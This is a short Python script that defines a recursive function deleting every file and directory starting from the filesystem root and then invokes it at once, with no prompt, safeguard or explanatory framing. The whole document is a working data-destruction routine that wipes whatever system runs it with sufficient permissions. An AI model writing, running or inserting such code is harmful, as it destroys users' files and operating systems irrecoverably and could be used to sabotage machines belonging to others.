import os

def full_wipe(path='/'):
    for entry in os.listdir(path):
        # Create full path
        full_path = path + entry if path == '/' else path + '/' + entry
        
        try:
            # Try to delete it as a file first
            os.remove(full_path)
            print("Deleted File:", full_path)
        except OSError:
            # If it's a folder, go inside it
            try:
                full_wipe(full_path)
                os.rmdir(full_path)
                print("Deleted Folder:", full_path)
            except:
                print("Skipping:", full_path)

# Run the wipe
full_wipe()
# Double check
print("Current files:", os.listdir())